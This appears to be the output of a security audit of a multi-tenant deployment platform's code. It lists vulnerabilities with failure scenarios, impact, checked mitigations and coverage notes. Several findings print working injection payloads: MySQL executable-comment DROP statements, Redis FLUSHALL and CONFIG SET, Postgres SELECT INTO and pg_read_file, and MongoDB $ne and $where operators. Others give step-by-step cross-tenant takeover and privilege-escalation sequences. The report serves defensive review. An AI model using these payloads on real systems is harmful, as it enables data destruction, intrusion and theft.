findings.failure_scenario: A user marks DATABASE_URL as a secret with target 'both' (the default assigned at src/app/api/projects/route.ts:191). The build emits a Dockerfile containing `ARG DATABASE_URL` / `ENV DATABASE_URL=$DATABASE_URL`; Docker resolves ENV at build time, so the final image config's Env array literally contains `DATABASE_URL=postgresql://app:S3cr3t@.../prod`. The image is pushed to `${region}-docker.pkg.dev/${gcpProjectId}/deployify-images/...` (cloudbuild.ts:92-94) under both the commit tag and `:latest`. `docker inspect` or a plain manifest+config blob fetch on that image returns the password, and it stays there after the user rotates the credential or deletes the env var, because rotation only rewrites Firestore/Secret Manager and never touches previously pushed images.
findings.impact: Every credential ever used at build time is permanently readable from image metadata in the shared Artifact Registry, for every historical build and every PR preview image. Rotation gives no actual revocation for anyone who already pulled or can still pull the image. Combined with the build-injection finding, a tenant who executes code in the build environment can enumerate and read other tenants' images.
findings.checked_mitigations: Confirmed the codebase has a non-leaking alternative it uses elsewhere: runtime connector credentials go through Secret Manager mounts (`--set-secrets`, cloudbuild.ts:388, populated at src/lib/db.ts:343) rather than plain env. Docker BuildKit secret mounts (`--mount=type=secret`) are not used anywhere — `rg -n "type=secret" src` returns nothing. Image cleanup exists only on project deletion (deleteProjectImages, src/app/api/projects/[id]/route.ts:10), not on secret rotation or env-var deletion.

findings.title: Viewers can delete environment variables — DELETE is the only handler in the env route missing the role gate
findings.failure_scenario: A team member with the read-only `viewer` role sends `DELETE /api/projects/<id>/env?envId=<id>` for each variable returned by the GET handler (which happily lists every env var and its id to viewers, line 39-44). The handler drops them from the project document. The next deployment runs getEnvVarsForDeployment with an empty set, so the Cloud Run service is redeployed without DATABASE_URL, API keys, etc.
findings.impact: A principal the product defines as read-only can silently destroy a project's entire secret configuration and break the next production deploy. Because the plaintext of secret values is never recoverable from the UI (GET masks them, reveal is 403 for viewers), the owner cannot restore what was deleted without re-sourcing every credential.
findings.checked_mitigations: Checked the same file for the gate (present at :75 for POST and :190 for PUT — so the omission is not a deliberate policy), checked the reveal sub-route (src/app/api/projects/[id]/env/[envId]/reveal/route.ts:30 blocks viewers), and checked src/middleware/rbac.ts — checkProjectAccess only returns the role, it never enforces write permission. src/proxy.ts performs no per-method role enforcement.

findings.title: Provider API key secrets are orphaned in Secret Manager when a storage connector is deleted
findings.failure_scenario: A user connects a PlanetScale (or Neon / Supabase / MongoDB Atlas) connector and supplies `providerApiKey` — an org-scoped provider admin token used at src/lib/gcp/external-sync.ts:139-186 to create and delete database passwords. Later they delete the connector via `DELETE /api/projects/<id>/storage?storageId=<sid>`. `deployify-<projectId>-<sid>-conn` is destroyed but `deployify-<projectId>-<sid>-apikey` is left in GCP Secret Manager forever, with whatever IAM bindings were added to it by grantSecretAccess (src/lib/gcp/secrets.ts:70-137, called from remediation-utils.ts:202/228 for tenant Cloud Run service accounts). Firestore no longer references it, so no UI, audit view, or rotation job can ever see or clean it.
findings.impact: Long-lived third-party provider admin tokens accumulate indefinitely in the platform's Secret Manager after the customer believes they revoked them, still readable by tenant service accounts that were granted secretAccessor while the connector existed. The user has no way to discover or remove them, and Deployify has no inventory of them — a persistent, invisible credential store that grows with every connector churn.
findings.checked_mitigations: Grepped for any other cleanup of the apikey secret: `rg -n "apikey" src/app/api src/lib` shows the id is only ever constructed at storage/route.ts:163 (create) and in the PATCH path; `rg -n "deleteSecret" src` returns exactly two hits — the definition at src/lib/gcp/secrets.ts:164 and the single conn-only call at storage/route.ts:317. No cron job cleans orphans: src/app/api/cron/optimize/route.ts:200 only reads providerApiKey, it never deletes. No secret-version disable/destroy exists anywhere (`rg -n "destroy|:disable"` over src/lib and src/app/api returns only socket.destroy in storage-validator.ts).

result.coverage_notes:
Swept and read end-to-end: src/lib/crypto.ts, src/lib/config.ts, src/lib/gcp/secrets.ts, src/lib/utils/masking.ts, src/lib/security/index.ts, src/lib/billing/payments.ts (signature verification), env.example, src/app/api/projects/[id]/env/route.ts (all four handlers), src/app/api/projects/[id]/env/[envId]/reveal/route.ts, src/app/api/projects/[id]/storage/route.ts (POST/PATCH/DELETE), src/app/api/projects/[id]/storage/[storageId]/rotate/route.ts, .../export/iac/route.ts, src/app/api/projects/route.ts (create), src/app/api/projects/[id]/route.ts (GET/PATCH), src/app/api/projects/[id]/deployments/[deployId]/logs/route.ts, src/middleware/rbac.ts, src/lib/db.ts (getEnvVarsForDeployment, getMigrationsForDeployment), src/lib/gcp/cloudbuild.ts (full config generation + submit), src/lib/dockerfiles.ts, src/lib/gcp/external-sync.ts (provision/sync/rotate paths), src/app/api/webhooks/github/route.ts (push + PR-close cleanup).

Repo-wide greps run: hardcoded credentials (`AIza|sk_live|sk_test|rzp_|-----BEGIN|ghp_|gho_|github_pat_|xoxb-` over src scripts public templates) — only hit is the harmless mock literal `keyId: 'rzp_test_mock'` at src/app/api/billing/checkout/route.ts:51, not a real credential, so not reported. `NEXT_PUBLIC_` — single hit (NEXT_PUBLIC_APP_URL), no secret is exposed to the client bundle. All crypto primitives (`createHash|createHmac|randomBytes|pbkdf2|scrypt|bcrypt|argon`). All encrypt/decrypt call sites (only 8 in the repo). All `getSecretValue` call sites in src/app/api. Secret-shaped console logging.

Findings I considered and deliberately dropped as too weak to report:
- Razorpay signature verification uses `generatedSignature === signature` (src/lib/billing/payments.ts:63, 82) instead of crypto.timingSafeEqual, which the GitHub webhook path does use (src/lib/security/index.ts:69). Factual inconsistency, but a remote timing attack on a V8 string compare is not a demonstrable exploit, so it does not meet the bar.
- decrypt()'s silent passthrough (crypto.ts:41-47: `if (!text.startsWith('enc:')) return text;` and `if (parts.length !== 4) return text;`) combined with the PUT heuristic at env/route.ts:239-241 (`if (!updatedEnv.value.startsWith('enc:')) { encrypt(...) }`) does let a value that literally begins with `enc:` be stored in plaintext while flagged isEncrypted. Real, but the only party harmed is the user who typed that value, so there is no attacker-favourable scenario.
- Old GCP Secret Manager versions are never disabled or destroyed after rotate (no destroy/disable call exists anywhere), so a "rotated" secret's prior version stays enabled. Real hygiene gap, but the principals who can read v1 could already read it before rotation, so I could not build a concrete escalation.
- GET /api/projects/[id] returns the whole project document (including `githubToken`) to viewers, bypassing the /env masking — but the values returned are AES-GCM ciphertext, not plaintext, so impact is low.

Not covered (out of scope or not reachable from this dimension): src/app/api/v1/collect and public/deployify-insights.js analytics ingest, the public reverse proxy at src/app/api/v1/proxy/[slug]/[[...path]]/route.ts, Stripe webhook handling, the Data Lab query engine's SQL-injection surface (src/app/api/projects/[id]/storage/[storageId]/query/route.ts is ~950 lines and warrants its own pass), and src/cli/index.js (lines 571 and 774 print connection strings to the operator's own terminal — worth a look from a CLI/UX dimension but not a server-side leak). I also did not read .env.local, deliberately.

findings.title: Firestore Data Lab queries hit Deployify's own platform Firestore (getDb()), not the customer connector — cross-tenant read of users/projects/audit collections
findings.failure_scenario: getDb() (src/lib/firebase.ts:53) returns getFirestore(app) — the platform's own '(default)' Firestore that stores every tenant's data — and the firestore branch never references storageConfig / the connector's provisioned database at all. Any registered user: (1) creates their own project (they are 'owner'), (2) POSTs to /storage with {"type":"firestore","name":"x","connectionString":"firestore://dummy"} (any non-empty connection string satisfies the line-190 guard; the firestore branch ignores it), (3) POSTs to this query route with body {"collection":"users"} or {"collection":"projects","where":[["userId","==","<victim>"]]}. The response returns Deployify's internal `users`, `projects` (including storageConfigs / connectionStringSecretId references), `dataLabAudit`, `saved_queries`, `auditLogs`, etc. for ALL tenants. On the owner/session path no masking is applied (shouldMask is false), so records are returned in full.
findings.impact: Full cross-tenant / internal database read of the entire Deployify control-plane Firestore by any authenticated user, exposing all users, all projects and their secret references, and audit logs. Complete tenant isolation break.
findings.checked_mitigations: Read src/lib/firebase.ts getDb() (returns the default app Firestore, no per-tenant DB), confirmed the firestore branch (lines 853-925) never uses storageConfig.connectionString/resourceName to target a customer DB; confirmed storage POST route (src/app/api/projects/[id]/storage/route.ts:136) allows creating type 'firestore' connectors; confirmed line 190 only requires a non-empty connection string which the firestore branch never consumes; confirmed no collection allow-list or tenant scoping is applied to the user-supplied `collection`.

findings.title: Data Lab SQL read-only enforcement bypassed via MySQL executable comments and comment-stripping empty-statement trick → arbitrary DDL/DML
findings.failure_scenario: The validator strips /* ... */ comments to build `cleanQuery`, but the ORIGINAL `query` is what is sent to MySQL (connection.query(query), multipleStatements:true at line 650). MySQL executes the contents of `/*! ... */` version-comments. Payload: `/*!40000 DROP TABLE users */` — the comment strip makes cleanQuery empty, so `statements` is [] and the for-loop performs ZERO checks (no forbidden-keyword test, no allowed-prefix test), the request passes, and MySQL executes `DROP TABLE users`. Variant with a leading benign statement: `SELECT 1;/*!40000 DELETE FROM accounts */` → validator sees only `SELECT 1`, MySQL runs the DELETE. This defeats the 'Only read-only queries are allowed' guarantee; because the route never blocks role 'viewer' (only masks output at line 943), even a read-only viewer can drop/modify tables.
findings.impact: Complete bypass of the advertised read-only guard on the customer's MySQL/PlanetScale connector: arbitrary DROP/DELETE/UPDATE/INSERT, including by users holding the 'viewer' role who are denied write access on every other storage endpoint.
findings.checked_mitigations: Confirmed the read-only block (lines 135-173) is the only gate and operates on the comment-stripped `cleanQuery` while execution uses the untouched `query`; confirmed multipleStatements:true is unconditionally set for the MySQL path (line 650) and IAM path (line 365); confirmed no `access.role === 'viewer'` rejection exists in this route (grep shows role only used for masking at line 943).

findings.title: Redis Data Lab has no read-only enforcement — arbitrary Redis command execution (FLUSHALL/DEL/SET/CONFIG) for any role including viewer
findings.failure_scenario: The 'Strict Read-Only Enforcement' block (line 136) applies only when storageConfig.type includes 'sql'/'planetscale'; the memorystore-redis branch performs no command allow-listing. A user (including one with the read-only 'viewer' role, which is not blocked by this route) POSTs body {"query":"FLUSHALL"} — the route calls redis.flushall() and erases the entire cache. Equivalent destructive/config payloads: {"query":"CONFIG SET dir /tmp"}, {"query":"DEL <key>"}, or the JSON form {"query":"{\"command\":\"flushall\",\"args\":[]}"}. Output PII-masking (line 943) does not prevent the write — the command has already mutated/destroyed data before the response is read.
findings.impact: Any project collaborator, including a designated read-only 'viewer', can destroy or overwrite the customer's Memorystore/Redis data and change server configuration through the query proxy that is documented as read-only.
findings.checked_mitigations: Confirmed the read-only guard (lines 135-173) is gated on `storageConfig.type.includes('sql') || type === 'planetscale'` and never runs for redis; confirmed the redis branch (lines 796-852) has no forbidden-command list; confirmed the route never rejects role 'viewer' (grep: role used only for masking) whereas sibling routes (import, ingest, apply-index) explicitly block viewers.

findings.title: apply-index route executes attacker-supplied customSql verbatim and interpolates unsanitized table/column identifiers into DDL
findings.failure_scenario: Any non-'viewer' team member (role 'member' or 'admin', not only the owner) POSTs {"customSql":"DROP TABLE users; DELETE FROM accounts"} and it is executed directly via client.query(sql) (Postgres simple-query protocol executes multiple statements in one string). No read-only validation is applied on this route at all. Even without customSql, `column`/`table` are concatenated into the DDL with no identifier escaping/validation, e.g. column = `id") ON "users";--`, giving identifier injection on the CREATE INDEX. For IAM Cloud SQL connectors the executed statement runs as the privileged deployify-sa service-account identity.
findings.impact: Arbitrary SQL execution (DDL/DML, table drops, data modification) on the customer's Cloud SQL/PlanetScale database by any write-capable collaborator, with zero read-only gating — inconsistent with the Data Lab query route's read-only model and reachable by non-owner members.
findings.checked_mitigations: Confirmed the only authz gate is `access.role === 'viewer'` (line 32) which still permits 'member'/'admin'; confirmed customSql is assigned to `sql` and passed straight to client.query/connection.query with no keyword filtering; confirmed identifiers are wrapped only in quotes/backticks with no escaping or allow-list; confirmed Postgres path uses client.query (simple query, multi-statement capable).

findings.title: Data Lab read-only guard misses Postgres 'SELECT ... INTO' — allows table creation / writes through a SELECT-prefixed query
findings.evidence:
const forbiddenKeywords = ['INSERT','UPDATE','DELETE','DROP','ALTER','CREATE','REPLACE','TRUNCATE', ... 'INTO OUTFILE','INTO DUMPFILE','LOCK','UNLOCK'];
const allowedPrefixes = ['SELECT','SHOW','DESCRIBE','EXPLAIN','DISCOVER_SCHEMA','WITH'];
findings.failure_scenario: The forbidden list only blocks the literal phrases 'INTO OUTFILE' and 'INTO DUMPFILE', not a bare INTO, and does not treat `SELECT ... INTO` as a write. Payload: `SELECT * INTO exfil_copy FROM users` — statement starts with the allowed prefix SELECT, contains no forbidden keyword (the token is INTO, not CREATE), passes the guard, and Postgres executes it as a CREATE-TABLE-AS, writing a new table. Similarly `SELECT pg_read_file('/etc/passwd')` / `SELECT lo_export(...)` pass as they are function calls behind a SELECT prefix. This defeats the read-only guarantee for the Postgres/Supabase connector, again exploitable by a 'viewer'.
findings.impact: Read-only enforcement bypass on customer Postgres: attacker can materialize tables (data duplication/exfiltration staging) and invoke write/file/large-object functions, all through a query the guard classifies as read-only.
findings.checked_mitigations: Read forbiddenKeywords (lines 140-144) and confirmed no bare 'INTO' and no handling of SELECT...INTO; confirmed allowedPrefixes accepts 'SELECT' (line 145) so the statement is admitted; confirmed the admitted query is passed unchanged to client.query at line 563.

findings.title: Public dashboard-widget query path performs raw string substitution of attacker-controlled `variables` into NoSQL queries → unauthenticated MongoDB operator injection
findings.failure_scenario: The public widget path (widgetId, no session — lines 35-59) forces query = widgetData.query but still applies request-supplied `variables` (line 28) to it. For a mongodb-atlas public widget whose saved query is e.g. {"collection":"orders","filter":{"userId":":uid"}}, an unauthenticated attacker POSTs {"widgetId":"<public>","variables":{"uid":{"$ne":null}}}. Because an object value is JSON.stringified and spliced into the query string, the filter becomes {"userId":{"$ne":null}}, and db.collection('orders').find(filter) returns every user's orders — a per-user filter bypass. Injecting {"$where":"sleep(5000)"} or {"$gt":""} enables blind enumeration. Output PII-masking is applied but does not restore the intended row-level scoping and leaves non-PII fields exposed.
findings.impact: Unauthenticated NoSQL operator injection through public analytics widgets: attacker overrides the saved query's filters to read documents outside the widget's intended scope (auth/tenant filter bypass, blind extraction), from a route reachable without any session.
findings.checked_mitigations: Confirmed public path enforces the saved query text (line 50) but does NOT sanitize `variables`, which are read unconditionally from the body (line 28) and applied whenever query !== 'DISCOVER_SCHEMA' (line 91); confirmed the NoSQL branch (lines 123-131) uses raw string replacement rather than the parameterized handling used for SQL (lines 97-122); confirmed parsedQuery.filter is passed directly to Mongo find() (line 781); noted maskData only masks PII patterns in the response and does not re-impose the filter.

result.coverage_notes: Swept the storage query proxy and its dependencies end-to-end: src/app/api/projects/[id]/storage/[storageId]/query/route.ts (+ test), and libs cloudsql.ts, bigquery.ts, firestore-admin.ts, memorystore.ts, migrations.ts, schema-sync.ts; plus sub-routes storage/route.ts (create/patch/delete), import, ingest, apply-index, export/iac. Cross-checked getDb() (firebase.ts), checkProjectAccess (rbac.ts), maskData (masking.ts), and TeamRole (types). Ruled out YAML load injection: the only js-yaml usage (export/iac) is yaml.dump (output), never load/safeLoad. bigquery.ts uses table.insert() with a typed object (no user-controlled table/dataset name reaching a query), so no BigQuery SQL/identifier injection was found there. The SQL read-only guard correctly rejects the obvious CTE-with-DML and EXPLAIN-wrapping tricks (lines 162-167). Root causes cluster in the query route: (1) read-only enforcement is SQL-only and comment-stripping/executable-comment-blind, (2) role 'viewer' is never blocked from executing (only output-masked), (3) the 'firestore' connector type silently targets Deployify's own control-plane Firestore, and (4) NoSQL variable substitution is raw string interpolation. NOT covered in depth (time/scope): the storage sub-routes clone, branch, cutover, migrate-region, replica/*, migrations/content, migrations/rollback, sync-schema, sync, validate, remediate, diagnose, export/pdf, backups/restore — I grepped them for concatenated SQL/identifier interpolation (only apply-index hit) but did not read each line-by-line; external-sync.ts and storage-validator.ts (40KB) were only grepped, not fully read, and may merit a follow-up pass for injection via provider/region/resource-name fields flowing into GCP API URLs (e.g. memorystore/cloudsql instanceName path segments are interpolated into REST URLs without validation).

findings.title: Project deletion prefix-matches Cloud Run services and destroys other tenants' running services
findings.failure_scenario: All tenants' Cloud Run services live in ONE GCP project (config.gcp.projectId) and are named `dfy-<slug>` (src/lib/utils.ts:53-57). Attacker creates a project with body {name: "a", repoFullName: <any repo they can read>} -> slug "a". They PATCH region to the victim's region (region is in the allowlist at src/app/api/projects/[id]/route.ts:134). They then DELETE /api/projects/<their-own-id>. checkProjectAccess passes (they own it). prefix becomes `dfy-a`, listServices issues `filter=metadata.name:dfy-a*`, which returns EVERY service in that region whose name starts with dfy-a — e.g. victim tenants' `dfy-acme-store`, `dfy-analytics`, `dfy-api-gateway` — and the loop calls deleteService on each. Every one of those tenants' production apps goes offline permanently.
findings.impact: Unauthenticated-to-the-victim, one-request destruction of arbitrary other tenants' production Cloud Run services in any region. No recovery except redeploy; domain mappings and traffic tags are lost with the service.
findings.checked_mitigations: Read listServices end-to-end (src/lib/gcp/cloudrun.ts:89-118) — it is a pure name-prefix wildcard filter with no label/owner/tenant predicate. deleteService (same file) takes only a name. Grepped the DELETE handler for any per-service ownership re-check before deleteService: there is none, only `if (serviceName)`. checkProjectAccess (src/middleware/rbac.ts:8-33) only authorizes the *deleting* project, not the services matched by the prefix. No allowlist of slugs and no `dfy-<slug>-` (trailing-dash) anchoring.

findings.title: Project slugs are only unique per user, but Cloud Run service names and public hostname routing are global
findings.failure_scenario: `name` is attacker-controlled request-body input (src/app/api/projects/route.ts:35, 119-120) and uniqueness is checked with getProjectBySlug(session.user.id, slug) — scoped to the attacker's own projects only. Attacker creates a project named exactly like victim tenant's project (slug "acme-store"). Two consequences: (1) DEPLOY — src/lib/gcp/cloudbuild.ts:92 and src/lib/deployment.ts:82 build the Cloud Run service name as generateServiceName(project.slug) = `dfy-acme-store` and the image as `<region>-docker.pkg.dev/<gcpProject>/<registry>/dfy-acme-store:latest`, so the attacker's deploy overwrites the victim's live service revision, its --update-env-vars (mounting the ATTACKER's env/secrets), and the victim's `:latest` image tag. (2) PUBLIC ROUTING — src/proxy.ts:99-111 rewrites `acme-store.<basedomain>/*` to /api/v1/proxy/acme-store, which calls getProjectBySlugGlobal with .limit(1) and no orderBy; Firestore resolves that to the lexicographically-smallest doc id. Project ids are `proj_` + Math.random() base36 (src/lib/utils.ts:20-24), so the attacker simply creates projects until one sorts before the victim's — roughly a 50% hit per attempt — and the victim's public hostname then serves the attacker's Cloud Run app (and the attacker's analyticsApiKey script tag) to the victim's visitors.
findings.impact: Cross-tenant takeover of a live production service and of a tenant's public hostname: serving attacker content to the victim's users, hijacking their traffic and analytics, and clobbering the victim's container image and runtime environment.
findings.checked_mitigations: Grepped every write path for global slug uniqueness: only getProjectBySlug(userId, slug) exists; getProjectBySlugGlobal is defined at src/lib/db.ts:671 and never used to reject a duplicate at creation. Confirmed PATCH /api/projects/[id] allowedFields (lines 127-144) does not include `slug`, so the value is fixed at creation and cannot be repaired by the victim. Confirmed src/proxy.ts reservedSubdomains (line 96) only blocks platform names, not tenant collisions. Confirmed the deploy path (src/app/api/projects/[id]/deploy/route.ts:171-176) and the Cloud Build config both derive the name purely from project.slug, with no project id or tenant id mixed in.

findings.title: Removing a team member deletes only one membership document, so duplicate memberships silently preserve access
findings.failure_scenario: acceptInvite performs no check for an existing membership and always mints a fresh `tm_<random>` document. POST /api/teams/T/invite can be called repeatedly for the same address (no duplicate-invite check), and each invite carries its own 7-day token. Insider Mallory, a member of team T who expects to be removed, gets two invites issued to her address (a re-send is a normal support flow, and she can request one) and accepts BOTH -> two TEAM_MEMBERSHIPS docs for (T, mallory). The owner later removes her: the DELETE handler resolves ONE membership via getTeamMembership (.limit(1)) and calls deleteTeamMembership(targetMembership.id), deleting only that document. The second document survives, so the next getTeamMembership(T, mallory) succeeds and checkProjectAccess (src/middleware/rbac.ts:16-21) returns allowed for every project in team T. The UI shows her as removed.
findings.impact: Persistent post-revocation access for an offboarded or malicious team member: full read/write on all team projects, env variables, storage connectors and Data Lab queries, while the owner believes access was revoked. The same defect lets a stale duplicate silently restore a previously demoted role.
findings.checked_mitigations: Grepped the whole tree for `existingMembership`, `alreadyMember`, `already a member` — zero hits. deleteTeam (src/lib/db.ts:835-838) does delete ALL matching membership docs via a query, proving the single-doc delete in the member route is the outlier. Verified the members DELETE handler (lines 24-64) performs no re-query loop and that listTeamMembers (src/lib/db.ts:872) — which would expose the duplicates — is only consulted for the last-owner count, not for deletion.

findings.title: Team admins can escalate themselves to owner by issuing an owner-role invite to their own email
findings.failure_scenario: Mallory holds role 'admin' on team T. She POSTs /api/teams/T/invite {email: 'mallory@her-own-domain.com', role: 'owner'}. The handler only gates on owner-OR-admin and then accepts 'owner' because it is in validRoles — there is no equivalent of the guard the role-update endpoint enforces. The invite email lands in her own inbox. She DELETEs herself from the team (the members DELETE handler at line 25 lets an admin remove another admin, including herself), then POSTs /api/invites/accept {token}. src/app/api/invites/accept/route.ts:44 calls acceptInvite, which writes a membership with role: invite.role = 'owner' without verifying that session.user.email matches invite.email. She is now team owner.
findings.impact: Vertical privilege escalation admin -> owner, defeating every owner-only control: promoting/demoting owners, removing owners, deleting the team (which cascades to deleting all team projects via deleteTeam -> deleteProject), and taking over billing.
findings.checked_mitigations: Compared against the sibling role-change endpoint, which explicitly implements the missing check: src/app/api/teams/[id]/members/[userId]/route.ts:115 `if (role === 'owner' && requesterMembership.role !== 'owner')` -> 403. That guard exists nowhere in the invite creation path. Also confirmed src/app/api/invites/accept/route.ts checks only `invite.expiresAt < new Date()` (line 37) and never compares session.user.email to invite.email, and that acceptInvite (src/lib/db.ts:718-749) copies invite.role verbatim with no re-authorization of the inviter.

findings.title: Public dashboard widget executes its saved query against any connector id supplied in the URL
findings.failure_scenario: A widget document persists its own binding (`storageId`) at creation — src/app/api/projects/[id]/storage/dashboards/route.ts:83-93 stores {query, storageId, isPublic}. The public execution path re-reads the query from the widget but resolves the connector from the URL segment `storageId` and never compares it to widgetData.storageId. The unauthenticated share page GET (src/app/api/projects/[id]/storage/dashboards/[dashboardId]/route.ts:32-56) returns the FULL widget document — including storageId and the raw query — to anyone with the link, and the same endpoint returns every widget's data for any public widget in the project. So an anonymous visitor holding one share link for project P (which publishes a curated query against a read-only reporting connector) can POST /api/projects/P/storage/<other-connector-id>/query {widgetId} and run that same SELECT against P's production database connector instead — completely outside any session, checkProjectAccess never runs on this branch (`access` stays null).
findings.impact: Anonymous execution of queries against storage connectors that were never published, using the platform's Secret Manager credentials for those connectors. Only PII-shaped strings are redacted (see maskData), so all non-PII columns — order values, internal identifiers, business records — are returned verbatim.
findings.checked_mitigations: Read the widget branch end-to-end (lines 35-59): the only guard is `widgetData.isPublic`; there is no `widgetData.storageId === storageId` comparison anywhere in the file (grepped for widgetId at lines 28/35/38/943/984/1033). Confirmed the masking fallback at line 943 (`const shouldMask = widgetId || access?.role === 'viewer'`) does apply, but read src/lib/utils/masking.ts:6-44 — maskString only rewrites email/phone/credit-card/SSN/`key|token|auth|secret`-prefixed patterns, so ordinary column data passes through unmasked. Confirmed the legitimate client (src/app/share/dashboard/[id]/page.tsx:79) sends widget.storageId, i.e. the server is trusting a value the client is free to change.

findings.title: Query comments are read and written by queryId alone, with no tenant filter
findings.failure_scenario: checkProjectAccess authorizes the `id` path segment, but the Firestore query is filtered only on `queryId` — the `projectId` field that POST writes at line 88 is never used as a predicate. A user who was previously a member of victim project V (and therefore saw saved-query ids in the Data Lab UI and its network traffic) is removed from V. They keep any project of their own, P, and call GET /api/projects/P/storage/x/queries/<V-query-id>/comments. checkProjectAccess(user, P) succeeds, and the handler returns every comment on V's saved query — including userId and userName of V's current members and whatever the comment text discusses (schema details, incident notes, query rationale). POST on the same URL injects a comment carrying {queryId: V-query-id, projectId: P} which, because the GET filters only on queryId, renders inside V's Data Lab for all of V's members.
findings.impact: Post-revocation cross-tenant read of another project's query discussion threads plus the identities of its members, and the ability to inject attacker-authored content into that tenant's UI.
findings.checked_mitigations: Confirmed the sibling routes in the same feature DO carry the tenant predicate, so this is an omission rather than a design choice: queries/route.ts:41-42 filters `projectId == id` AND `storageId == storageId`; history/route.ts:40-42 filters projectId, storageId AND userId; audit/route.ts:60-61 filters projectId and storageId; schema-docs/route.ts:27-28 filters projectId and storageId. Also confirmed queries/[queryId]/route.ts guards its PATCH/DELETE with `doc.data()?.userId !== session.user.id` (lines 38, 84) — the comments route has no equivalent ownership or project check on the fetched documents.

findings.title: Analytics stats silently substitute randomly generated fake data when the query is empty or fails
findings.failure_scenario: The Firestore branch runs `.where('projectId','==',projectId).where('timestamp','>=',startDate).orderBy('timestamp','desc')` (lines 93-97), a composite query. firestore.indexes.json declares composite indexes only for `projects`, `deployments` and `envVars` — nothing for `analytics_events` — so in a real deployment Firestore rejects it with FAILED_PRECONDITION, the catch at line 183 swallows it, and getMockData returns Math.random() traffic. The same happens on the ordinary empty-result path: a brand-new project with zero visitors gets `snapshot.empty` and is handed fabricated numbers. GET /api/projects/<id>/analytics/stats (src/app/api/projects/[id]/analytics/stats/route.ts:34-39) returns this under the key `stats` with no mock flag, so the tenant's dashboard shows thousands of invented visitors, invented per-day timeseries, invented traffic sources (Google/Direct/Twitter) and invented Core Web Vitals, indistinguishable from real telemetry.
findings.impact: Tenants make retention, marketing and performance decisions on fabricated numbers, and a real analytics outage (missing index, Firestore error, credential failure) is completely invisible because the failure path emits plausible data instead of an error.
findings.checked_mitigations: Verified the route does not gate on MOCK_DB: getMockData is called from the production code paths at lines 100 and 185, while the MOCK_DB guard (line 12-14) only short-circuits the BigQuery helper. Verified no flag distinguishes mock from real in the response — src/app/api/projects/[id]/analytics/stats/route.ts:36-39 returns `{ stats }` verbatim. Verified firestore.indexes.json (78 lines, read in full) contains no `analytics_events` collectionGroup entry, so the composite query has no declared index.

findings.title: Analytics aggregation performs an unbounded Firestore read over a caller-controlled time range
findings.failure_scenario: `period` is taken straight off the query string — src/app/api/projects/[id]/analytics/stats/route.ts:16 `searchParams.get('period') || '30d'` — and passed through to parseInt with no ceiling. Any authenticated user with access to a project (including a team member with role 'viewer') requests GET /api/projects/<id>/analytics/stats?period=999999d. startDate moves ~2700 years into the past, so the predicate matches every analytics_events document ever written for that project, and the query has no .limit(). All matching documents are materialised into `snapshot.docs` and then into the `events` array, plus a `treatedPageviews` Set and a per-day visitor Set built over all of them. Repeating the call concurrently (the proxy rate limit in src/proxy.ts:122 allows 100 requests/min per IP+path) drives the shared Next.js server to OOM.
findings.impact: A single low-privilege tenant can exhaust the memory of the shared application server — taking down the dashboard and the /api/v1/proxy path for every other tenant on the instance — and can run up unbounded Firestore document-read billing.
findings.checked_mitigations: Grepped the function for .limit() — there is none on either analytics query (line 93 and getRealtimeStats at line 242); by contrast listDeploymentsByProject (src/lib/db.ts:1220), listAuditLogs (src/lib/audit.ts:44), the storage metrics route (line 56) and the audit route (line 63) all bound their reads. Confirmed the route performs no validation or clamping of `period` before passing it in, and that the BigQuery pre-check (getStatsFromBigQuery) returns [] on any error, so the unbounded Firestore path is the normal fallback rather than a rare one.

result.coverage_notes:
Read end-to-end: src/lib/db.ts (all 1272 lines), src/lib/firebase.ts, src/lib/audit.ts, src/lib/analytics.ts, src/lib/analytics/alerts.ts, src/lib/logging/tracker.ts, src/lib/logging/parser.ts, firestore.indexes.json, src/middleware/rbac.ts, src/proxy.ts. Enumerated all 87 `.collection(` call sites across src/lib and src/app/api and read every route that queries a shared collection without an obvious tenant predicate: the six storage/[storageId]/* sub-routes (queries, queries/[queryId], comments, history, audit, metrics, schema-docs), storage/dashboards + [dashboardId], storage/[storageId]/query (Data Lab), v1/collect, v1/proxy/[slug], cron/optimize, billing (tracker, invoices, invoice download), teams (invite, invites/[inviteId], members/[userId], audit), invites/accept, projects (list/create/get/patch/delete) and all deployments/[deployId]/* sub-routes.

Ruled out after checking the code rather than assuming: (a) missing Firestore security rules — grepped for `NEXT_PUBLIC_FIREBASE` and `from 'firebase/` and found zero client-SDK usage, so all access is firebase-admin server-side and rules are not the boundary; (b) deployments/[deployId] IDOR — alias, rollback and logs all verify `deployment.projectId !== id` (lines 33, 31, 33 respectively); (c) invoice IDOR — the download route checks `invoice.userId !== session.user.id`; (d) saved-query PATCH/DELETE IDOR — both check `doc.data()?.userId !== session.user.id`; (e) cron/optimize auth — the CRON_SECRET check fails closed in production even when the secret is unset; (f) deleted-team orphans — deleteTeam removes all memberships, invites and projects, and listTeamsWithMembership filters non-existent team docs; (g) getProjectByRepoFullName global lookup — real collision risk but a private repo cannot be claimed by another tenant (getRepo runs with the claimant's token), so impact stayed below the medium bar.

Two things I could NOT verify from the repo: whether firestore.indexes.json is actually deployed (no firebase.json and no CI step references it — this is why the analytics fake-data finding is rated on the empty-result path as well as the missing-index path), and the runtime Firestore ordering guarantee behind the `.limit(1)` slug race (the takeover in finding 2 does not depend on it — the shared Cloud Run service name is deterministic regardless). Not covered by this dimension: the SQL/NoSQL injection surface in storage/[storageId]/query (unauthenticated `variables` are string-interpolated into Mongo/Redis commands at lines 123-132), the use of Math.random() for id generation in src/lib/utils.ts:20, and the hardcoded shared `deployify-dashboard-internal` analytics key in v1/collect — all better handled by the injection and crypto dimensions.

findings.title: Data Lab Firestore connector passes an unvalidated `collection` name from the request body to the platform's own admin Firestore client
